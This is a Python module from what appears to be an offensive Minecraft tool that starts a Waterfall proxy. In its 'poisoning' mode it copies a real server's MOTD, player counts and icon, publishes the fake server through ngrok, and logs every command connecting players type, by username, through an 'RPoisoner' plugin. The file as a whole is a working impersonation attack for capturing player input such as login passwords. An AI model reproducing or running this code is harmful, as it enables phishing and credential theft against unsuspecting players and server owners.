#!/usr/bin/python3

import subprocess
import shutil
import time
import os

from utils.waterfall.WaterFallUpdate import search_for_waterfall_updates
from utils.managers.Settings import SettingsManager
from utils.writefile.WriteFile import WriteFile
from utils.minecraftserver.ServerData import mcsrvstatus
from utils.checks.Encoding import check_encoding
from utils.checks.Folder import check_folders
from utils.managers.Logs import LogsManager
from utils.gets.LogFile import create_file
from utils.gets.Language import language
from utils.color.TextColor import paint
from utils.gets.IPNgrok import get_ip_ngrok

sm = SettingsManager()
settings = sm.read('settings')


def start_waterfall(server, check_updates, ngrok=False):
    """ 
    Start the waterfall.jar that is necessary 

    :param server: Server IP and port
    :param check_updates: Boolean value to know whether to check for an update
    :param ngrok: Boolean value to know if the command is bungee or poison
    """

    old_content = ''

    try:
        if check_updates:
            search_for_waterfall_updates()

        paint(f'\n    {language["script"]["PREFIX"]}{language["waterfall_messages"]["CONFIGURING"]}')
        time.sleep(1)

        with open('utils/otherfiles/proxy_settings', 'r', encoding=check_encoding('utils/otherfiles/proxy_settings')) as f:
            proxy_settings = f.read()

        if ngrok:
            proxy_settings = proxy_settings.replace('[[PORT]]', settings['POISONING_PORT']
                                          ).replace('[[ADDRESS]]', server)
            location = 'poisoning'
            port = settings['POISONING_PORT']

        else:
            proxy_settings = proxy_settings.replace('[[PORT]]', settings['BUNGEE_PORT']
                                          ).replace('[[ADDRESS]]', server)
            location = 'bungee'
            port = settings['BUNGEE_PORT']

        WriteFile(f'utils/waterfall/proxy/{location}/config.yml', True, 'w+', proxy_settings)

        if ngrok:
            file = create_file('poisoning')
            logs = LogsManager('poisoning', file)
            logs.create(server)
            paint(f'\n    {language["script"]["PREFIX"]}{language["commands"]["poisoning"]["COPYING_DATA"]}')
            check_folders('utils/waterfall/proxy/poisoning/plugins/RPoisoner')
            time.sleep(0.5)

            data = mcsrvstatus(server)

            if data is None:
                paint(f'\n    {language["script"]["PREFIX"]}{language["commands"]["poisoning"]["INVALID_SERVER"]}')
                return

            try:
                os.remove('utils/waterfall/proxy/poisoning/plugins/CleanMOTD/config.yml')
                os.remove('utils/waterfall/proxy/poisoning/server-icon.png')

            except FileNotFoundError:
                pass

            try:
                _ = data[2][0]
                _ = data[2][1]
                long_motd = True  # If the motd has two lines

            except IndexError:
                long_motd = False  # If the motd has only one line

            with open('utils/otherfiles/cleanmotd_settings', 'r', encoding=check_encoding('utils/otherfiles/cleanmotd_settings')) as f:
                cleanmotd_settings = f.read()

            cleanmotd_settings = cleanmotd_settings.replace('[[MAX_PLAYERS]]', str(data[4])
                            ).replace('[[AMOUNT]]', str(data[3]))
            
            if long_motd:
                cleanmotd_settings = f'{cleanmotd_settings}\n        {data[2][0]}\n        {data[2][1]}'

            else:
                cleanmotd_settings = f'{cleanmotd_settings}\n        {data[2][0]}'

            WriteFile(f'utils/waterfall/proxy/{location}/plugins/CleanMOTD/config.yml', True, 'w+', cleanmotd_settings)

            if data[5] is not None:
                with open(f'utils/waterfall/proxy/{location}/server-icon.png', 'wb') as f:
                    f.truncate(0)
                    f.write(data[5])

            else:  # If the specified server has no image: Use the default image of a Minecraft server
                shutil.copy('utils/otherfiles/server-icon.png', f'utils/waterfall/proxy/{location}/server-icon.png')

            command_file = f'utils/waterfall/proxy/{location}/plugins/RPoisoner/commands.txt'
            if os.path.exists(command_file):  # Check if the RPoisoner plugin 'commands.txt' file exists (If it exists delete the previous content)
                with open(command_file, 'w+', encoding='utf8') as f:
                    f.truncate(0)

            paint(f'\n    {language["script"]["PREFIX"]}{language["commands"]["poisoning"]["NGROK_START"]}')
            ngrok = subprocess.Popen(f'{settings["NGROK_COMMAND"]} {settings["POISONING_PORT"]}', stdout=subprocess.PIPE, shell=True)
            time.sleep(0.5)

            ip_ngrok = get_ip_ngrok()

            if ip_ngrok is None:
                paint(f'\n    {language["script"]["PREFIX"]}{language["commands"]["poisoning"]["IP_NGROK_ERROR"]}')
                return

        paint(f'\n    {language["script"]["PREFIX"]}{language["waterfall_messages"]["STARTING"]}')
        time.sleep(0.5)
        proxy = subprocess.Popen(f'cd utils/waterfall/proxy/{location} && {settings["PROXY_COMMAND"]}', stdout=subprocess.PIPE, shell=True)

        if ngrok:
            paint(f'\n    {language["waterfall_messages"]["PROXY_SERVER_STARTED"].replace("[0]", ip_ngrok)} [lwhite]([red]127.0.0.1:{settings["POISONING_PORT"]}[lwhite])')
            paint(f'\n    {language["script"]["PREFIX"]}{language["commands"]["poisoning"]["WAITING_FOR_COMMANDS"]}\n')

        else:
            paint(f'\n    {language["waterfall_messages"]["PROXY_SERVER_STARTED"].replace("[0]", f"""127.0.0.1:{port}""")}')

    except KeyboardInterrupt:
        paint(f'\n    {language["script"]["PREFIX"]}{language["waterfall_messages"]["STOPPING"]}')
        return

    while True:
        try:
            time.sleep(1)

            if ngrok:
                with open(command_file, 'r+', encoding=check_encoding(command_file)) as f:
                    content = f.readlines()

                if content == old_content:
                    continue

                old_content = content

                for line in content:
                    line = line.split(' -> ')
                    username = line[0][1 : -1]
                    logs.write('save_command', username, line[1])
                    paint(f'    {language["commands"]["poisoning"]["COMMAND_CAPTURED"].replace("[0]", username)} [lgreen]{line[1]}')

        except KeyboardInterrupt:
            if ngrok:
                paint(f'    {language["script"]["PREFIX"]}{language["waterfall_messages"]["STOPPING"]}')
                ngrok.kill()

            else:
                paint(f'\n    {language["script"]["PREFIX"]}{language["waterfall_messages"]["STOPPING"]}')

            proxy.kill()
            return